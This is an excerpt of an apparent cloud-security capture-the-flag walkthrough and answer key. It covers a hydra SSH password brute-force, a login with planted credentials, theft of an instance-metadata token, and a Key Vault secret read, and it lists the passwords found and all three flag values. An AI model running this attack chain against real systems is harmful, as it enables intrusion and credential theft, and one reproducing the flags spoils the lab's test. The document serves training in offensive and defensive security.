...
Use hydra with the NCSC 100k password list (installed from GitHub SecLists):
...
Hydra finds the password (rank ~72421 in the list):

```
[22][ssh] host: <target_ip>   login: backup_user   password: 123456789ABCDe
```
...
```bash
saboteur validate 'AZS_F{0e9f7ec236a8}'
...
```bash
ssh app_admin@<next_vm_ip>
```

Password: `XTIP9#S#v@MccGy7`
...
```bash
saboteur validate 'AZS_F{b15e428cb678}'
...
```bash
saboteur validate 'AZS_F{e558143ba68e}'
...
|------|--------|-----------|------|
| 1 | NET-MGMT-EXPOSED | SSH banner recon → hydra brute-force (`123456789ABCDe`) | `AZS_F{0e9f7ec236a8}` |
| 2 | CMP-IMDS | SSH with planted creds → IMDS token theft | `AZS_F{b15e428cb678}` |
| 3 | STR-KEYVAULT-POLICY | Key Vault secret read with stolen token | `AZS_F{e558143ba68e}` |
